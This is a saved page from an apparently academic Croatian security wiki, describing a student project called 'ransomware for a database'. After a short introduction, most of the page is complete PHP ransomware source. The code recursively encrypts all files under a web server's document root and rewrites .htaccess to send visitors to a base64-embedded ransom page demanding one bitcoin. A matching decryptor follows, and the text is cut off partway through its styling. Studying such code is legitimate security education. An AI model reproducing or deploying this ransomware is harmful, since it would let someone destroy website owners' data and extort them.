@@ -1,0 +1,684 @@
+<!DOCTYPE html>
+<html lang="hr" dir="ltr">
+<head>
+<meta charset="UTF-8" />
+<title>Ransomware za bazu podataka - SIS Wiki</title>
+<meta name="generator" content="MediaWiki 1.17.0" />
+<link rel="shortcut icon" href="http://security.foi.hr/favicon.ico" />
+<link rel="search" type="application/opensearchdescription+xml" href="../opensearch_desc.php" title="SIS Wiki (hr)" />
+<link rel="EditURI" type="application/rsd+xml" href="../api.php%3Faction=rsd" />
+<link title="Creative Commons" type="application/rdf+xml" href="http://security.foi.hr/wiki/index.php?title=Ransomware_za_bazu_podataka&amp;action=creativecommons" rel="meta" />
+<link rel="copyright" href="http://creativecommons.org/licenses/by-sa/3.0/" />
+<link rel="alternate" type="application/atom+xml" title="SIS Wiki Atom izvor" href="../index.php%3Ftitle=Posebno:Nedavne_promjene&amp;feed=atom" />
+<link rel="stylesheet" href="../load.php%3Fdebug=false&amp;lang=hr&amp;modules=mediawiki.legacy.commonPrint%252Cshared%257Cskins.vector&amp;only=styles&amp;skin=vector&amp;*.css" />
+<meta name="ResourceLoaderDynamicStyles" content="" />
+<!--[if lt IE 7]><style type="text/css">body{behavior:url("/wiki/skins/vector/csshover.min.htc")}</style><![endif]--></head>
+<body class="mediawiki ltr ns-0 ns-subject page-Ransomware_za_bazu_podataka skin-vector">
+		<div id="mw-page-base" class="noprint"></div>
+		<div id="mw-head-base" class="noprint"></div>
+		<!-- content -->
+		<div id="content">
+			<a id="top"></a>
+			<div id="mw-js-message" style="display:none;"></div>
+						<!-- firstHeading -->
+			<h1 id="firstHeading" class="firstHeading">Ransomware za bazu podataka</h1>
+			<!-- /firstHeading -->
+			<!-- bodyContent -->
+			<div id="bodyContent">
+				<!-- tagline -->
+				<div id="siteSub">Izvor: SIS Wiki</div>
+				<!-- /tagline -->
+				<!-- subtitle -->
+				<div id="contentSub"></div>
+				<!-- /subtitle -->
+																<!-- jumpto -->
+				<div id="jump-to-nav">
+					Skoči na: <a href="Ransomware_za_bazu_podataka.html#mw-head">orijentacija</a>,
+					<a href="Ransomware_za_bazu_podataka.html#p-search">traži</a>
+				</div>
+				<!-- /jumpto -->
+								<!-- bodytext -->
+				<p>Izradio: Ivan Šincek
+</p>
+<table id="toc" class="toc"><tr><td><div id="toctitle"><h2>Sadržaj</h2></div>
+<ul>
+<li class="toclevel-1 tocsection-1"><a href="Ransomware_za_bazu_podataka.html#Uvod"><span class="tocnumber">1</span> <span class="toctext">Uvod</span></a></li>
+<li class="toclevel-1 tocsection-2"><a href="Ransomware_za_bazu_podataka.html#Pokretanje_malicioznog_koda"><span class="tocnumber">2</span> <span class="toctext">Pokretanje malicioznog koda</span></a></li>
+<li class="toclevel-1 tocsection-3"><a href="Ransomware_za_bazu_podataka.html#Maliciozni_kod"><span class="tocnumber">3</span> <span class="toctext">Maliciozni kod</span></a></li>
+<li class="toclevel-1 tocsection-4"><a href="Ransomware_za_bazu_podataka.html#Ransomware_enkripcija"><span class="tocnumber">4</span> <span class="toctext">Ransomware enkripcija</span></a></li>
+<li class="toclevel-1 tocsection-5"><a href="Ransomware_za_bazu_podataka.html#Ransomware_dekripcija"><span class="tocnumber">5</span> <span class="toctext">Ransomware dekripcija</span></a></li>
+<li class="toclevel-1 tocsection-6"><a href="Ransomware_za_bazu_podataka.html#Literatura"><span class="tocnumber">6</span> <span class="toctext">Literatura</span></a></li>
+</ul>
+</td></tr></table>
+<h2> <span class="mw-headline" id="Uvod"> Uvod </span></h2>
+<p>Ransomware je tip malicioznog programskog koda iz područja kriptovirologije koji prijeti korisnicima i poduzećima da će javno objaviti njihove osjetljive podatke ili da će nastaviti blokirati pristup istim podacima ako nije tražena otkupnina plaćena. Dok amaterski ransomware u većini slučajeva zabrani pristup podacima, a kojeg je vrlo lako povratiti, napredni malware koristi tehnike poput kriptoviralne iznude, gdje se svaka datoteka kriptira posebno, pri čemu ona postaje beskorisna, te zahtijeva otkupninu da se one povrate u prvobitni oblik. U kvalitetno dizajniranom kriptoviralnom napadu iznude, vraćanje podataka u prvobitni oblik bez ključa za dešifriranje je gotovo nemoguće – isto tako u napadu se koriste digitalne valute poput Ukash-a i Bitcoin-a za plaćanje otkupnine, pri čemu je gotovo nemoguće uči u trag napadačima.
+</p>
+<h2> <span class="mw-headline" id="Pokretanje_malicioznog_koda"> Pokretanje malicioznog koda </span></h2>
+<p>Ransomware napadi se najčešće prenose u obliku trojanskog konja, pri čemu se maliciozni kod prikazuje korisniku kao legitima datoteka koju korisnik preuzme na prijevaru ili neki trik te pokrene. Najčešći medij prijenosa je email. Međutim napredni ransomware-i mogu biti i ukomponirani u druge maliciozne kodove poput crva (npr. "WannaCry") te mogu putovati samostalno kroz mrežu bez interakcije korisnika.
+</p><p>U ovom projektu maliciozni kod ransomware-a nalazi se unutar jedne PHP datoteke koja se može na razne načine prenijeti na server, a njeno izvršenje je ručno, što znači da korisnik mora sam posjetiti tu PHP skriptu kako bi se maliciozni kod izvršio.
+</p>
+<h2> <span class="mw-headline" id="Maliciozni_kod"> Maliciozni kod </span></h2>
+<p>Izvršavanje enkripcije i dekripcije provodi se tako da se skeniraju svi direktoriji, odnosno datoteke, unutar samo root direktorija poslužitelja rekurzivno. Postupak enkripcije je takav da se čita sadržaj datoteke i preko matematičkog algoritma izračunava kriptirani (nerazumljivi) sadržaj na temelju učitanog razumljivog sadržaja. Nakon enkripcije sadržaja preimenuje se naziv datoteke nasumično generiranim nizom znakova, a pravo ime datoteke se zapiše unutar samog kriptografskog sadržaja kako bi se kasnije moglo povratiti. Postupak dekripcije je sličan kao i postupak enkripcije, učitava se nerazumljiv sadržaj te se obrnutim matematičkim postupkom iz nerazumljivog sadržaja izračunava razumljiv (prvobitan) sadržaj. Te se ime datoteke preimenuje stvarnim imenom pohranjenim unutar kriptografskog sadržaja.
+</p><p>Prilikom kriptiranja, ako unutar root direktorija poslužitelja postoji .htaccess datoteka ona se kriptira i preimenuje, te se stvara vlastita maliciozna .htaccess datoteka koja sav promet preusmjerava na novo generiranu datoteku "get_rekt.php" koja služi za dekripciju i sadrži sve potrebne podatke o plaćanju otkupnine. Nakon uspješnog plaćanja otkupnine, odnosno unosa ispravnog ključa za dešifriranje, maliciozna .htaccesss datoteke zajedno s datotekom za dekripciju se briše te se vraća prvobitna .htaccess datoteka, a zatim i sve ostale datoteke.
+</p>
+<h2> <span class="mw-headline" id="Ransomware_enkripcija"> Ransomware enkripcija </span></h2>
+<pre>
+&lt;?php
+class RansomwareEncrypt {
+	private function htaccessEncrypt() {
+		if (file_exists($_SERVER['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR . '.htaccess')) {
+			rename($_SERVER['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR . '.htaccess', $_SERVER['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR . '.get_rekt');
+		}
+		file_put_contents(
+			$_SERVER['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR . 'get_rekt.php',
+			base64_decode('
+				PD9waHANCmNsYXNzIFJhbnNvbXdhcmVEZWNyeXB0IHsNCglwcml2YXRlIGZ1bmN0aW9uIGh0YWNj
+				ZXNzRGVjcnlwdCgpIHsNCgkJdW5saW5rKCRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10gLiBESVJF
+				Q1RPUllfU0VQQVJBVE9SIC4gJy5odGFjY2VzcycpOw0KCQl1bmxpbmsoJF9TRVJWRVJbJ0RPQ1VN
+				RU5UX1JPT1QnXSAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAnZ2V0X3Jla3QucGhwJyk7DQoJCWlm
+				IChmaWxlX2V4aXN0cygkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddIC4gRElSRUNUT1JZX1NFUEFS
+				QVRPUiAuICcuZ2V0X3Jla3QnKSkgew0KCQkJcmVuYW1lKCRfU0VSVkVSWydET0NVTUVOVF9ST09U
+				J10gLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJy5nZXRfcmVrdCcsICRfU0VSVkVSWydET0NVTUVO
+				VF9ST09UJ10gLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJy5odGFjY2VzcycpOw0KCQl9DQoJfQ0K
+				CXByaXZhdGUgZnVuY3Rpb24gZGVjcnlwdEZpbGUoJGZpbGUsICRrZXkpIHsNCgkJaWYgKCRmaWxl
+				ICE9ICRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10gLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJy5o
+				dGFjY2VzcycgJiYgJGZpbGUgIT0gJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXSAuIERJUkVDVE9S
+				WV9TRVBBUkFUT1IgLiAnZ2V0X3Jla3QucGhwJykgew0KCQkJJHRleHQgPSBiYXNlNjRfZGVjb2Rl
+				KGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlKSk7DQoJCQkka2V5ID0gaGFzaCgnc2hhMjU2JywgJGtl
+				eSk7DQoJCQkkaXYgPSBzdWJzdHIoaGFzaCgnc2hhMjU2JywgJGtleSksIDAsIDE2KTsNCgkJCSRk
+				ZWNyeXB0ZWRUZXh0ID0gb3BlbnNzbF9kZWNyeXB0KCR0ZXh0LCAnQUVTLTI1Ni1DQkMnLCAka2V5
+				LCAwLCAkaXYpOw0KCQkJJHBvc2l0aW9uID0gc3RycG9zKCRkZWNyeXB0ZWRUZXh0LCAnPGZpbGVO
+				YW1lPicpOw0KCQkJJGZpbGVOYW1lID0gc3Vic3RyKCRkZWNyeXB0ZWRUZXh0LCAwLCAkcG9zaXRp
+				b24pOw0KCQkJJGRlY3J5cHRlZFRleHQgPSBzdWJzdHIoJGRlY3J5cHRlZFRleHQsICRwb3NpdGlv
+				biArIHN0cmxlbignPGZpbGVOYW1lPicpKTsNCgkJCWZpbGVfcHV0X2NvbnRlbnRzKCRmaWxlLCAk
+				ZGVjcnlwdGVkVGV4dCk7DQoJCQlyZW5hbWUoJGZpbGUsICRmaWxlTmFtZSk7DQoJCX0NCgl9DQog
+				ICAgc3RhdGljIGZ1bmN0aW9uIGRlY3J5cHQoJGRpciwgJGtleSwgJGh0YWNjZXNzID0gZmFsc2Up
+				IHsNCgkJJGZpbGVzID0gYXJyYXlfZGlmZihzY2FuZGlyKCRkaXIpLCBhcnJheSgnLicsICcuLicp
+				KTsNCgkJZm9yZWFjaCAoJGZpbGVzIGFzICRmaWxlKSB7DQoJCQlpZiAoaXNfZGlyKCRkaXIgLiBE
+				SVJFQ1RPUllfU0VQQVJBVE9SIC4gJGZpbGUpKSB7DQoJCQkJc2VsZjo6ZGVjcnlwdCgkZGlyIC4g
+				RElSRUNUT1JZX1NFUEFSQVRPUiAuICRmaWxlLCAka2V5KTsNCgkJCX0gZWxzZSB7DQoJCQkJc2Vs
+				Zjo6ZGVjcnlwdEZpbGUoJGRpciAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkZmlsZSwgJGtleSk7
+				DQoJCQl9DQoJCX0NCgkJaWYgKCRodGFjY2Vzcykgew0KCQkJc2VsZjo6aHRhY2Nlc3NEZWNyeXB0
+				KCk7DQoJCX0NCiAgICB9DQp9DQokZXJyb3JNZXNzYWdlcyA9IGFycmF5KA0KCSdrZXknID0+ICcn
+				DQopOw0KaWYgKGlzc2V0KCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddKSAmJiBzdHJ0b2xvd2Vy
+				KCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddKSA9PT0gJ3Bvc3QnKSB7DQogICAgaWYgKGlzc2V0
+				KCRfUE9TVFsnc3VibWl0J10pICYmIGlzc2V0KCRfUE9TVFsna2V5J10pKSB7DQoJCSRwYXJhbWV0
+				ZXJzID0gYXJyYXkoDQoJCQkna2V5JyA9PiB0cmltKCRfUE9TVFsna2V5J10pDQoJCSk7DQoJCSRl
+				cnJvciA9IGZhbHNlOw0KICAgICAgICBpZiAobWJfc3RybGVuKCRwYXJhbWV0ZXJzWydrZXknXSkg
+				PCAxKSB7DQogICAgICAgICAgICAkZXJyb3JNZXNzYWdlc1sna2V5J10gPSAnUGxlYXNlIGVudGVy
+				IGRlY3J5cHRpb24ga2V5JzsNCiAgICAgICAgICAgICRlcnJvciA9IHRydWU7DQogICAgICAgIH0N
+				CgkJaWYgKCEkZXJyb3IpIHsNCgkJCVJhbnNvbXdhcmVEZWNyeXB0OjpkZWNyeXB0KCRfU0VSVkVS
+				WydET0NVTUVOVF9ST09UJ10sICRwYXJhbWV0ZXJzWydrZXknXSwgdHJ1ZSk7DQoJCQloZWFkZXIo
+				J0xvY2F0aW9uOiAvJyk7DQoJCQlleGl0KCk7DQoJCX0NCgl9DQp9DQo/Pg0KPCFET0NUWVBFIGh0
+				bWw+DQo8aHRtbCBsYW5nPSJlbiI+DQoJPGhlYWQ+DQoJCTxtZXRhIGNoYXJzZXQ9IlVURi04Ij4N
+				CgkJPHRpdGxlPlJhbnNvbXdhcmU8L3RpdGxlPg0KCQk8bWV0YSBuYW1lPSJkZXNjcmlwdGlvbiIg
+				Y29udGVudD0iIj4NCgkJPG1ldGEgbmFtZT0ia2V5d29yZHMiIGNvbnRlbnQ9IiI+DQoJCTxtZXRh
+				IG5hbWU9ImF1dGhvciIgY29udGVudD0iSXZhbiDFoGluY2VrIj4NCgkJPG1ldGEgbmFtZT0idmll
+				d3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPg0K
+				CQk8c3R5bGU+DQoJCQlodG1sIHsNCgkJCQloZWlnaHQ6IDEwMCU7DQoJCQl9DQoJCQlib2R5IHsN
+				CgkJCQliYWNrZ3JvdW5kLWNvbG9yOiAjMjYyNjI2Ow0KCQkJCWRpc3BsYXk6IGZsZXg7DQoJCQkJ
+				ZmxleC1kaXJlY3Rpb246IGNvbHVtbjsNCgkJCQloZWlnaHQ6IGluaGVyaXQ7DQoJCQkJbWFyZ2lu
+				OiAwOw0KCQkJCWNvbG9yOiAjRkZGOw0KCQkJCWZvbnQtZmFtaWx5OiBBcmlhbCwgSGVsdmV0aWNh
+				LCBzYW5zLXNlcmlmOw0KCQkJCWZvbnQtc2l6ZTogMWVtOw0KCQkJCWZvbnQtd2VpZ2h0OiA0MDA7
+				DQoJCQkJdGV4dC1hbGlnbjogbGVmdDsNCgkJCX0NCgkJCS5mb3JtIHsNCgkJCQlkaXNwbGF5OiBm
+				bGV4Ow0KCQkJCWZsZXgtZGlyZWN0aW9uOiBjb2x1bW47DQoJCQkJYWxpZ24taXRlbXM6IGNlbnRl
+				cjsNCgkJCQlqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsNCgkJCQlmbGV4OiAxIDAgYXV0bzsNCgkJ
+				CQlwYWRkaW5nOiAuNWVtOw0KCQkJfQ0KCQkJLmZvcm0gLmxheW91dCB7DQoJCQkJYmFja2dyb3Vu
+				ZC1jb2xvcjogI0RDRENEQzsNCgkJCQlwYWRkaW5nOiAxLjVlbTsNCgkJCQl3aWR0aDogMjRlbTsN
+				CgkJCQljb2xvcjogIzAwMDsNCgkJCQlib3JkZXI6IC4wN2VtIHNvbGlkICMwMDA7DQoJCQl9DQoJ
+				CQkuZm9ybSAubGF5b3V0IGhlYWRlciBoMSB7DQoJCQkJbWFyZ2luOiAwIDAgLjVlbSAwOw0KCQkJ
+				CWZvbnQtc2l6ZTogMi42ZW07DQoJCQkJZm9udC13ZWlnaHQ6IDQwMDsNCgkJCQl0ZXh0LWFsaWdu
+				OiBjZW50ZXI7DQoJCQl9DQoJCQkuZm9ybSAubGF5b3V0IGZvcm0gew0KCQkJCWRpc3BsYXk6IGZs
+				ZXg7DQoJCQkJZmxleC1kaXJlY3Rpb246IGNvbHVtbjsNCgkJCX0NCgkJCS5mb3JtIC5sYXlvdXQg
+				Zm9ybSBsYWJlbCB7DQoJCQkJbWFyZ2luOiAwIDAgLjFlbTsNCgkJCX0NCgkJCS5mb3JtIC5sYXlv
+				dXQgZm9ybSBpbnB1dCB7DQoJCQkJLXdlYmtpdC1hcHBlYXJhbmNlOiBub25lOw0KCQkJCW1hcmdp
+				bjogMDsNCgkJCQlwYWRkaW5nOiAuMmVtIC40ZW07DQoJCQkJZm9udC1mYW1pbHk6ICdBcm1hdGEn
+				LCBzYW5zLXNlcmlmOw0KCQkJCWZvbnQtc2l6ZTogMWVtOw0KCQkJCWJvcmRlcjogLjA3ZW0gc29s
+				aWQgIzlEMkEwMDsNCgkJCQktd2Via2l0LWJvcmRlci1yYWRpdXM6IDA7DQoJCQl9DQoJCQkuZm9y
+				bSAubGF5b3V0IGZvcm0gaW5wdXRbdHlwZT0ic3VibWl0Il0gew0KCQkJCWJhY2tncm91bmQtY29s
+				b3I6ICNGRjQ1MDA7DQoJCQkJY29sb3I6ICNGRkY7DQoJCQkJY3Vyc29yOiBwb2ludGVyOw0KCQkJ
+				CXRyYW5zaXRpb246IGJhY2tncm91bmQtY29sb3IgMjIwbXMgbGluZWFyOw0KCQkJfQ0KCQkJLmZv
+				cm0gLmxheW91dCBmb3JtIGlucHV0W3R5cGU9InN1Ym1pdCJdOmhvdmVyIHsNCgkJCQliYWNrZ3Jv
+				dW5kLWNvbG9yOiAjRDgzQTAwOw0KCQkJCXRyYW5zaXRpb246IGJhY2tncm91bmQtY29sb3IgMjIw
+				bXMgbGluZWFyOw0KCQkJfQ0KCQkJLmZvcm0gLmxheW91dCBmb3JtIC5lcnJvciB7DQoJCQkJbWFy
+				Z2luOiAwIDAgMWVtOw0KCQkJCWNvbG9yOiAjOUQyQTAwOw0KCQkJCWZvbnQtc2l6ZTogLjhlbTsN
+				CgkJCX0NCgkJCS5mb3JtIC5sYXlvdXQgZm9ybSAuZXJyb3I6bm90KDplbXB0eSkgew0KCQkJCW1h
+				cmdpbjogLjJlbSAwIDFlbTsNCgkJCX0NCgkJCS5mb3JtIC5wYXkgew0KCQkJCWJhY2tncm91bmQt
+				Y29sb3I6IHJnYmEoMCwgMCwgMCwgLjcpOw0KCQkJCWRpc3BsYXk6IGZsZXg7DQoJCQkJZmxleC1k
+				aXJlY3Rpb246IGNvbHVtbjsNCgkJCQlhbGlnbi1pdGVtczogY2VudGVyOw0KCQkJCXBvc2l0aW9u
+				OiBhYnNvbHV0ZTsNCgkJCQlib3R0b206IDA7DQoJCQkJbGVmdDogMDsNCgkJCQlwYWRkaW5nOiAu
+				MmVtOw0KCQkJCXdpZHRoOiAyMjVweDsNCgkJCX0NCgkJCS5mb3JtIC5wYXkgaW1nIHsNCgkJCQlt
+				YXJnaW46IDAgMCAuMmVtOw0KCQkJCXdpZHRoOiBpbmhlcml0Ow0KCQkJfQ0KCQkJLmZvcm0gLnBh
+				eSBwIHsNCgkJCQltYXJnaW46IDA7DQoJCQkJY29sb3I6ICNGRkY7DQoJCQl9DQoJCTwvc3R5bGU+
+				DQoJPC9oZWFkPg0KCTxib2R5Pg0KCQk8ZGl2IGNsYXNzPSJmb3JtIj4NCgkJCTxkaXYgY2xhc3M9
+				InBheSI+DQoJCQkJPGltZyBzcmM9Imh0dHBzOi8vY2hhcnQuZ29vZ2xlYXBpcy5jb20vY2hhcnQ/
+				Y2hzPTIyNXgyMjUmY2hsZD1MfDImY2h0PXFyJmNobD1iaXRjb2luOjFCclpNNlQ3RzlSTjh2YmFi
+				bmZYdTRNNkxwZ3p0cTZZMTQ/YW1vdW50PTEiIGFsdD0iMUJyWk02VDdHOVJOOHZiYWJuZlh1NE02
+				THBnenRxNlkxNCI+DQoJCQkJPHAgaHJlZj0iIj5QYXkgMSBCVEMhPC9wPg0KCQkJPC9kaXY+DQoJ
+				CQk8ZGl2IGNsYXNzPSJsYXlvdXQiPg0KCQkJCTxoZWFkZXI+DQoJCQkJCTxoMT5SYW5zb213YXJl
+				PC9oMT4NCgkJCQk8L2hlYWRlcj4NCgkJCQk8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iIj4N
+				CgkJCQkJPGxhYmVsIGZvcj0icGFzc3dvcmQiPkRlY3J5cHRpb24gS2V5PC9sYWJlbD4NCgkJCQkJ
+				PGlucHV0IG5hbWU9ImtleSIgaWQ9ImtleSIgdHlwZT0idGV4dCIgc3BlbGxjaGVjaz0iZmFsc2Ui
+				IGF1dG9mb2N1cz0iYXV0b2ZvY3VzIj4NCgkJCQkJPHAgY2xhc3M9ImVycm9yIj48P3BocCBlY2hv
+				ICRlcnJvck1lc3NhZ2VzWydrZXknXTsgPz48L3A+DQoJCQkJCTxpbnB1dCBuYW1lPSJzdWJtaXQi
+				IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkRlY3J5cHQiPg0KCQkJCTwvZm9ybT4NCgkJCTwvZGl2Pg0K
+				CQk8L2Rpdj4NCgk8L2JvZHk+DQo8L2h0bWw+
+			')
+		);
+		file_put_contents($_SERVER['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR . '.htaccess', &quot;DirectoryIndex get_rekt.php\nErrorDocument 404 get_rekt.php&quot;);
+	}
+	private function encryptFile($file, $key) {
+		if ($file&#160;!= $_SERVER['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR . '.htaccess' &amp;&amp; $file&#160;!= $_SERVER['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR . 'get_rekt.php') {
+			$text = file_get_contents($file);
+			$key = hash('sha256', $key);
+			$iv = substr(hash('sha256', $key), 0, 16);
+			$encryptedText = base64_encode((openssl_encrypt($file . '&lt;fileName&gt;' . $text, 'AES-256-CBC', $key, 0, $iv)));
+			file_put_contents($file, $encryptedText);
+			rename($file, pathinfo($file)['dirname'] . DIRECTORY_SEPARATOR . substr($encryptedText, 0, 128) . substr($encryptedText, 0, 3));
+		}
+	}
+    static function encrypt($dir, $key, $htaccess = false) {
+		if ($htaccess) {
+			self::htaccessEncrypt();
+		}
+		$files = array_diff(scandir($dir), array('.', '..'));
+		foreach ($files as $file) {
+			if (is_dir($dir . DIRECTORY_SEPARATOR . $file)) {
+				self::encrypt($dir . DIRECTORY_SEPARATOR . $file, $key);
+			} else {
+				self::encryptFile($dir . DIRECTORY_SEPARATOR . $file, $key);
+			}
+		}
+    }
+}
+$errorMessages = array(
+	'key' =&gt; ''
+);
+if (isset($_SERVER['REQUEST_METHOD']) &amp;&amp; strtolower($_SERVER['REQUEST_METHOD']) === 'post') {
+    if (isset($_POST['submit']) &amp;&amp; isset($_POST['key'])) {
+		$parameters = array(
+			'key' =&gt; trim($_POST['key'])
+		);
+		$error = false;
+        if (mb_strlen($parameters['key']) &lt; 1) {
+            $errorMessages['key'] = 'Please enter encryption key';
+            $error = true;
+        }
+		if (!$error) {
+			RansomwareEncrypt::encrypt($_SERVER['DOCUMENT_ROOT'], $parameters['key'], true);
+			header('Location: /');
+			exit();
+		}
+	}
+}
+?&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+	&lt;head&gt;
+		&lt;meta charset=&quot;UTF-8&quot;&gt;
+		&lt;title&gt;Ransomware&lt;/title&gt;
+		&lt;meta name=&quot;description&quot; content=&quot;&quot;&gt;
+		&lt;meta name=&quot;keywords&quot; content=&quot;&quot;&gt;
+		&lt;meta name=&quot;author&quot; content=&quot;Ivan Šincek&quot;&gt;
+		&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+		&lt;style&gt;
+			html {
+				height: 100%;
+			}
+			body {
+				background-color: #262626;
+				display: flex;
+				flex-direction: column;
+				height: inherit;
+				margin: 0;
+				color: #FFF;
+				font-family: Arial, Helvetica, sans-serif;
+				font-size: 1em;
+				font-weight: 400;
+				text-align: left;
+			}
+			.form {
+				display: flex;
+				flex-direction: column;
+				align-items: center;
+				justify-content: center;
+				flex: 1 0 auto;
+				padding: .5em;
+			}
+			.form .layout {
+				background-color: #DCDCDC;
+				padding: 1.5em;
+				width: 24em;
+				color: #000;
+				border: .07em solid #000;
+			}
+			.form .layout header h1 {
+				margin: 0 0 .5em 0;
+				font-size: 2.6em;
+				font-weight: 400;
+				text-align: center;
+			}
+			.form .layout form {
+				display: flex;
+				flex-direction: column;
+			}
+			.form .layout form label {
+				margin: 0 0 .1em;
+			}
+			.form .layout form input {
+				-webkit-appearance: none;
+				margin: 0;
+				padding: .2em .4em;
+				font-family: 'Armata', sans-serif;
+				font-size: 1em;
+				border: .07em solid #9D2A00;
+				-webkit-border-radius: 0;
+			}
+			.form .layout form input[type=&quot;submit&quot;] {
+				background-color: #FF4500;
+				color: #FFF;
+				cursor: pointer;
+				transition: background-color 220ms linear;
+			}
+			.form .layout form input[type=&quot;submit&quot;]:hover {
+				background-color: #D83A00;
+				transition: background-color 220ms linear;
+			}
+			.form .layout form .error {
+				margin: 0 0 1em;
+				color: #9D2A00;
+				font-size: .8em;
+			}
+			.form .layout form .error:not(:empty) {
+				margin: .2em 0 1em;
+			}
+		&lt;/style&gt;
+	&lt;/head&gt;
+	&lt;body&gt;
+		&lt;div class=&quot;form&quot;&gt;
+			&lt;div class=&quot;layout&quot;&gt;
+				&lt;header&gt;
+					&lt;h1&gt;Ransomware&lt;/h1&gt;
+				&lt;/header&gt;
+				&lt;form method=&quot;post&quot; action=&quot;&quot;&gt;
+					&lt;label for=&quot;password&quot;&gt;Encryption Key&lt;/label&gt;
+					&lt;input name=&quot;key&quot; id=&quot;key&quot; type=&quot;text&quot; spellcheck=&quot;false&quot; autofocus=&quot;autofocus&quot;&gt;
+					&lt;p class=&quot;error&quot;&gt;&lt;?php echo $errorMessages['key'];&#160;?&gt;&lt;/p&gt;
+					&lt;input name=&quot;submit&quot; type=&quot;submit&quot; value=&quot;Encrypt&quot;&gt;
+				&lt;/form&gt;
+			&lt;/div&gt;
+		&lt;/div&gt;
+	&lt;/body&gt;
+&lt;/html&gt;
+</pre>
+<h2> <span class="mw-headline" id="Ransomware_dekripcija"> Ransomware dekripcija </span></h2>
+<pre>
+&lt;?php
+class RansomwareDecrypt {
+	private function htaccessDecrypt() {
+		unlink($_SERVER['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR . '.htaccess');
+		unlink($_SERVER['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR . 'get_rekt.php');
+		if (file_exists($_SERVER['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR . '.get_rekt')) {
+			rename($_SERVER['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR . '.get_rekt', $_SERVER['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR . '.htaccess');
+		}
+	}
+	private function decryptFile($file, $key) {
+		if ($file&#160;!= $_SERVER['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR . '.htaccess' &amp;&amp; $file&#160;!= $_SERVER['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR . 'get_rekt.php') {
+			$text = base64_decode(file_get_contents($file));
+			$key = hash('sha256', $key);
+			$iv = substr(hash('sha256', $key), 0, 16);
+			$decryptedText = openssl_decrypt($text, 'AES-256-CBC', $key, 0, $iv);
+			$position = strpos($decryptedText, '&lt;fileName&gt;');
+			$fileName = substr($decryptedText, 0, $position);
+			$decryptedText = substr($decryptedText, $position + strlen('&lt;fileName&gt;'));
+			file_put_contents($file, $decryptedText);
+			rename($file, $fileName);
+		}
+	}
+    static function decrypt($dir, $key, $htaccess = false) {
+		$files = array_diff(scandir($dir), array('.', '..'));
+		foreach ($files as $file) {
+			if (is_dir($dir . DIRECTORY_SEPARATOR . $file)) {
+				self::decrypt($dir . DIRECTORY_SEPARATOR . $file, $key);
+			} else {
+				self::decryptFile($dir . DIRECTORY_SEPARATOR . $file, $key);
+			}
+		}
+		if ($htaccess) {
+			self::htaccessDecrypt();
+		}
+    }
+}
+$errorMessages = array(
+	'key' =&gt; ''
+);
+if (isset($_SERVER['REQUEST_METHOD']) &amp;&amp; strtolower($_SERVER['REQUEST_METHOD']) === 'post') {
+    if (isset($_POST['submit']) &amp;&amp; isset($_POST['key'])) {
+		$parameters = array(
+			'key' =&gt; trim($_POST['key'])
+		);
+		$error = false;
+        if (mb_strlen($parameters['key']) &lt; 1) {
+            $errorMessages['key'] = 'Please enter decryption key';
+            $error = true;
+        }
+		if (!$error) {
+			RansomwareDecrypt::decrypt($_SERVER['DOCUMENT_ROOT'], $parameters['key'], true);
+			header('Location: /');
+			exit();
+		}
+	}
+}
+?&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+	&lt;head&gt;
+		&lt;meta charset=&quot;UTF-8&quot;&gt;
+		&lt;title&gt;Ransomware&lt;/title&gt;
+		&lt;meta name=&quot;description&quot; content=&quot;&quot;&gt;
+		&lt;meta name=&quot;keywords&quot; content=&quot;&quot;&gt;
+		&lt;meta name=&quot;author&quot; content=&quot;Ivan Šincek&quot;&gt;
+		&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+		&lt;style&gt;
+			html {
+				height: 100%;
+			}
+			body {
+				background-color: #262626;
+				display: flex;
+				flex-direction: column;
+				height: inherit;
+				margin: 0;
+				color: #FFF;
+				font-family: Arial, Helvetica, sans-serif;
+				font-size: 1em;
+				font-weight: 400;
+				text-align: left;
+			}
+			.form {
+				display: flex;
+				flex-direction: column;
+				align-items: center;
+				justify-content: center;
+				flex: 1 0 auto;
+				padding: .5em;
+			}
+			.form .layout {
+				background-color: #DCDCDC;
+				padding: 1.5em;
+				width: 24em;
+				color: #000;
+				border: .07em solid #000;
+			}
+			.form .layout header h1 {
+				margin: 0 0 .5em 0;
+				font-size: 2.6em;
+				font-weight: 400;
+				text-align: center;
+			}
+			.form .layout form {
+				display: flex;
+				flex-direction: column;
+			}
+			.form .layout form label {
+				margin: 0 0 .1em;
+			}
